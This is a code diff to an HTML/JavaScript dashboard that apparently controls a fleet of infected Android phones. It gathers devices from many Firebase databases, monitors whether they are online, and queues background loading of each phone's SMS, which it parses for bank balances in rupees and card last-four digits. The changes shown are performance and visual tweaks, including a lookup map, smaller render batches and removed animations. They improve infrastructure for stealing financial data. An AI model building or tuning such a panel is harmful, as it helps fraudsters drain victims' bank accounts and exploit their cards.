@@ -40,7 +40,7 @@ body{
 ::-webkit-scrollbar-track{background:transparent;}
 ::-webkit-scrollbar-thumb{background:linear-gradient(180deg,rgba(255,47,60,.35),rgba(140,0,10,.35));border-radius:8px;border:2px solid transparent;background-clip:padding-box;}
 input,textarea,select,button{font-family:inherit;}
-.device-card,.stat-inner,.login-box,.dpanel{will-change:transform;transform:translateZ(0);}
+.stat-inner,.login-box{will-change:transform;transform:translateZ(0);}
 
 @keyframes spinSlow{to{transform:rotate(360deg);}}
 @keyframes spinReverse{to{transform:rotate(-360deg);}}
@@ -149,7 +149,7 @@ input,textarea,select,button{font-family:inherit;}
 .grid-wrap{padding:0 20px;max-width:1500px;margin:0 auto;}
 .device-list{display:flex;flex-direction:column;gap:16px;}
 .device-flip{perspective:1400px;position:relative;content-visibility:auto;contain-intrinsic-size:0 240px;contain:layout style;}
-.device-card{position:relative;overflow:hidden;cursor:pointer;background:linear-gradient(180deg, rgba(22,22,40,.82), rgba(12,12,22,.82));backdrop-filter:blur(14px);border:1px solid var(--outline);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow-sm);transform-style:preserve-3d;transition:transform .7s var(--ease-bounce), border-color .3s, box-shadow .3s;animation:staggerFadeIn .5s var(--ease-out) backwards;}
+.device-card{position:relative;overflow:hidden;cursor:pointer;background:linear-gradient(180deg, rgba(22,22,40,.94), rgba(12,12,22,.94));border:1px solid var(--outline);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow-sm);transform-style:preserve-3d;transition:transform .7s var(--ease-bounce), border-color .3s, box-shadow .3s;}
 .device-flip.flipped .device-card{transform:rotateY(180deg);}
 .device-flip.flipped .device-card-front{opacity:0;visibility:hidden;pointer-events:none;}
 .device-flip.flipped .device-card-back{opacity:1;visibility:visible;pointer-events:auto;}
@@ -163,8 +163,7 @@ input,textarea,select,button{font-family:inherit;}
 .device-card:hover::before{opacity:1;}
 
 .device-card .card-header{display:flex;align-items:flex-start;gap:13px;margin-bottom:13px;}
-.device-card .avatar{width:52px;height:52px;border-radius:15px;flex-shrink:0;position:relative;background:radial-gradient(circle at 50% 25%, #242440, #06060d);display:flex;align-items:center;justify-content:center;overflow:hidden;border:1px solid rgba(255,47,60,.35);box-shadow:0 6px 24px rgba(255,47,60,.28);}
-.device-card .avatar svg{width:100%;height:100%;}
+.device-card .avatar{width:52px;height:52px;border-radius:15px;flex-shrink:0;position:relative;background:radial-gradient(circle at 50% 25%, #24243c, #06060d);display:flex;align-items:center;justify-content:center;border:1px solid rgba(255,47,60,.35);font-size:24px;line-height:1;}
 .device-card .info{flex:1;min-width:0;}
 .device-card .device-name{font-family:'Cinzel',serif;font-weight:800;font-size:14px;color:#fff;margin-bottom:7px;word-break:break-word;line-height:1.3;display:flex;align-items:center;flex-wrap:wrap;gap:6px;}
 .device-card .device-name .badges{display:inline-flex;gap:5px;flex-wrap:wrap;}
@@ -225,7 +224,7 @@ input,textarea,select,button{font-family:inherit;}
 .fab{position:fixed;bottom:28px;right:28px;width:66px;height:66px;border-radius:50%;background:linear-gradient(135deg,#ff3a47,#8c000a);border:none;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 16px 48px rgba(255,47,60,.6);z-index:500;transition:all .4s var(--ease-bounce);}
 .fab::before{content:"";position:absolute;inset:-8px;border-radius:50%;background:radial-gradient(circle,rgba(255,47,60,.5),transparent 65%);filter:blur(12px);animation:pulseGlow 3s ease-in-out infinite;pointer-events:none;}
 .fab:hover{transform:scale(1.14) rotate(22deg);}
-.fab svg{width:34px;height:34px;position:relative;z-index:1;}
+.fab svg{width:30px;height:30px;position:relative;z-index:1;}
 
 .doverlay{position:fixed;inset:0;z-index:1000;background:rgba(0,0,0,.85);backdrop-filter:blur(14px);display:flex;justify-content:flex-end;animation:fadeIn .35s;}
 .dpanel{width:100%;max-width:580px;background:linear-gradient(180deg,#0a0a16,#050510);border-left:1px solid rgba(255,47,60,.28);display:flex;flex-direction:column;overflow:hidden;animation:slideInRight .5s var(--ease-out);}
@@ -629,7 +628,11 @@ input,textarea,select,button{font-family:inherit;}
   <div class="grid-wrap"><div class="device-list" id="deviceList"></div></div>
 
   <button class="fab" id="fabBtn" title="Refresh">
-    <svg viewBox="0 0 400 400"><use href="#premium-logo"/></svg>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M23 4v6h-6"/><path d="M1 20v-6h6"/>
+      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10"/>
+      <path d="M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
+    </svg>
   </button>
 </div>
 
@@ -647,7 +650,7 @@ function initParticles(){
   var c = document.getElementById('particlesContainer');
   if (!c) return;
   c.innerHTML = '';
-  var n = window.innerWidth < 640 ? 15 : 30;
+  var n = window.innerWidth < 640 ? 6 : 12;
   for (var i=0;i<n;i++){
     var p = document.createElement('div');
     p.className = 'particle';
@@ -943,7 +946,13 @@ var S = {
 };
 
 var STAR_KEY = 'dark_stars_v6';
-var RENDER_BATCH = 120;
+var RENDER_BATCH = 60;
+var DEV_MAP = Object.create(null);
+function rebuildDevMap(){
+  DEV_MAP = Object.create(null);
+  for (var _i=0;_i<S.devices.length;_i++){ var _d=S.devices[_i]; DEV_MAP[_d.id+'::'+_d._url]=_d; }
+}
+function findDevice(id, url){ return DEV_MAP[id+'::'+url] || null; }
 
 function loadStars(){ try{var r=localStorage.getItem(STAR_KEY);return r?JSON.parse(r):{};}catch(e){return{};} }
 function saveStars(){ try{localStorage.setItem(STAR_KEY,JSON.stringify(S.stars));}catch(e){} }
@@ -1197,6 +1206,7 @@ async function fetchAllDevices(){
   S.smsLoaded = {};
   S.smsLoadStarted = false;
   S.renderToken++;
+  rebuildDevMap();
   updateStats();
 
   var seen = {}, done = 0, total = FIREBASES.length, t0 = Date.now();
@@ -1254,6 +1264,7 @@ async function fetchAllDevices(){
     await pLimit(ftasks, 30);
   }
 
+  rebuildDevMap();
   updateStats();
   renderDevices();
   toast('✅ ' + S.devices.length.toLocaleString('en-IN') + ' devices loaded','ok');
@@ -1274,7 +1285,7 @@ async function realtimeStatusCheck(){
     Object.keys(fullData).forEach(function(id){
       var d = fullData[id];
       if (!d || typeof d !== 'object') return;
-      var dev = S.devices.find(function(x){ return x.id === id && x._url === url; });
+      var dev = findDevice(id, url);
       if (!dev) return;
       var ns = d.status === true || d.status === 'true' || d.status === 1 || d.status === 'online';
       if (ns !== dev.status){ dev.status = ns; dev._statusChanged = Date.now(); }
@@ -1286,10 +1297,10 @@ async function realtimeStatusCheck(){
 }
 
 function updateVisibleStatuses(){
+  var map = Object.create(null);
+  for (var _i=0;_i<S.devices.length;_i++){ var _d=S.devices[_i]; map[_d.id+'::'+_d._url]=_d; }
   document.querySelectorAll('.device-flip').forEach(function(wrap){
-    var id = wrap.getAttribute('data-id');
-    var url = wrap.getAttribute('data-url');
-    var dev = S.devices.find(function(x){ return x.id === id && x._url === url; });
+    var dev = map[wrap.getAttribute('data-id')+'::'+wrap.getAttribute('data-url')];
     if (!dev) return;
     var pill = wrap.querySelector('.status-pill');
     if (!pill) return;
@@ -1306,7 +1317,7 @@ function updateVisibleStatuses(){
    ═══════════════════════════════════════════ */
 var SMS_QUEUE = {
   queue: [],
-  queuedKeys: {},   // dedupe: track what's already in queue
+  queuedKeys: {},
   active: 0,
   running: false,
   maxConcurrent: 6,
@@ -1315,8 +1326,8 @@ var SMS_QUEUE = {
 
   push: function(dev, priority){
     var k = dev.id + '::' + dev._url;
-    if (this.queuedKeys[k]) return;      // already in queue
-    if (S.smsLoaded[k]) return;           // already loaded
+    if (this.queuedKeys[k]) return;
+    if (S.smsLoaded[k]) return;
     this.queuedKeys[k] = 1;
     this.queue.push({dev: dev, priority: priority ? 1 : 0, key: k});
     if (priority) this.queue.sort(function(a,b){ return b.priority - a.priority; });
@@ -1333,7 +1344,6 @@ var SMS_QUEUE = {
     var self = this;
     if (self.queue.length === 0 && self.active === 0){
       self.running = false;
-      // When all done, if still on bank/card filter and list is empty, refresh
       if (S.filter === 'bank' || S.filter === 'card'){
         renderDevices();
       }
@@ -1354,14 +1364,12 @@ var SMS_QUEUE = {
     if (now - this.lastStatUpdate > 350){ this.lastStatUpdate = now; updateStats(); }
     if (now - this.lastFilterUpdate > 600){ this.lastFilterUpdate = now; updateFilterCounts(); }
 
-    // If we're on bank/card filter and this device now matches, append it live
     if (S.filter === 'bank' || S.filter === 'card'){
       var sd = S.smsData[dev.id];
       var matches = false;
       if (S.filter === 'bank') matches = sd && sd.bankBalances && sd.bankBalances.length > 0;
       else if (S.filter === 'card') matches = sd && sd.cards && sd.cards.length > 0;
       if (matches && !S.currentFilteredList.some(function(x){ return x.id === dev.id && x._url === dev._url; })){
-        // Only append if the current render is done and we're on the same filter
         if (S.currentRenderIndex >= S.currentFilteredList.length){
           appendNewMatch(dev);
         }
@@ -1380,7 +1388,6 @@ function appendNewMatch(dev){
   var tmp = document.createElement('div');
   tmp.innerHTML = html;
   var newCard = tmp.firstChild;
-  // Insert before sentinel or append at end
   if (sentinel && sentinel.parentNode === list){
     list.insertBefore(newCard, sentinel);
   } else {
@@ -1390,7 +1397,7 @@ function appendNewMatch(dev){
 }
 
 function startBackgroundSmsLoad(){
-  if (S.smsLoadStarted) return;   // guard: only start once
+  if (S.smsLoadStarted) return;
   S.smsLoadStarted = true;
   var pending = S.devices.filter(function(d){ return !S.smsLoaded[d.id + '::' + d._url]; });
   if (pending.length === 0) return;
@@ -1407,7 +1414,6 @@ function prioritySmsLoad(){
     return !S.smsLoaded[k] && !SMS_QUEUE.queuedKeys[k];
   });
   pending.forEach(function(d){ SMS_QUEUE.push(d, true); });
-  // Allow re-trigger after queue drains
   setTimeout(function(){ _priorityLoadRunning = false; }, 2000);
 }
 
@@ -1611,8 +1617,7 @@ function renderNextBatch(token, sentinel, list){
   var tmp = document.createElement('div');
   var html = '';
   for (var i = S.currentRenderIndex; i < end; i++){
-    var delay = Math.min((i - S.currentRenderIndex) * 0.008, 0.25);
-    html += renderCardHTML(S.currentFilteredList[i], delay);
+    html += renderCardHTML(S.currentFilteredList[i], 0);
   }
   tmp.innerHTML = html;
   while (tmp.firstChild) frag.appendChild(tmp.firstChild);
@@ -1670,13 +1675,11 @@ function renderCardHTML(d, delay){
     + (hasBank ? '<div class="back-row"><span class="bl">Balance</span><span class="bv green">₹' + fmtINR(sd.bankBalances[0].availableBalance) + '</span></div>' : '')
     + (hasCard ? '<div class="back-row"><span class="bl">Card</span><span class="bv">•••• ' + esc(sd.cards[0].cardLast4) + '</span></div>' : '');
 
-  var animDelay = delay ? ' style="animation-delay:'+delay+'s"' : '';
-
   return '<div class="device-flip" data-id="'+esc(d.id)+'" data-url="'+esc(d._url)+'">'
-    + '<div class="device-card"'+animDelay+'>'
+    + '<div class="device-card">'
     + '<div class="device-card-front">'
     +   '<div class="card-header">'
-    +     '<div class="avatar"><svg viewBox="0 0 400 400"><use href="#premium-logo"/></svg></div>'
+    +     '<div class="avatar">📱</div>'
     +     '<div class="info">'
     +       '<div class="device-name">' + esc(d.name) + '<span class="badges">' + badges + '</span></div>'
     +       '<div class="field"><span class="k">ID</span><span class="v mono">' + esc(d.id.substring(0,22)) + (d.id.length>22?'…':'') + '</span></div>'
@@ -1716,7 +1719,7 @@ document.getElementById('deviceList').addEventListener('click', function(ev){
     var card = refBtn.closest('.device-flip');
     var id = card.getAttribute('data-id');
     var url = card.getAttribute('data-url');
-    var dev = S.devices.find(function(x){ return x.id===id && x._url===url; });
+    var dev = findDevice(id, url);
     if (!dev) return;
     refBtn.classList.add('spinning');
     delete S.smsLoaded[dev.id + '::' + dev._url];
@@ -1755,7 +1758,7 @@ document.getElementById('deviceList').addEventListener('click', function(ev){
     var cardS = starBtn.closest('.device-flip');
     var idS = cardS.getAttribute('data-id');
     var urlS = cardS.getAttribute('data-url');
-    var devS = S.devices.find(function(x){ return x.id===idS && x._url===urlS; });
+    var devS = findDevice(idS, urlS);
     if (devS){
       toggleStar(devS);
       starBtn.classList.toggle('active');
@@ -1775,7 +1778,7 @@ document.getElementById('deviceList').addEventListener('click', function(ev){
     if (cardEl.classList.contains('flipped')) return;
     var id2 = cardEl.getAttribute('data-id');
     var url2 = cardEl.getAttribute('data-url');
-    var dev2 = S.devices.find(function(x){ return x.id===id2 && x._url===url2; });
+    var dev2 = findDevice(id2, url2);
     if (dev2) openDetail(dev2);
   }
 });
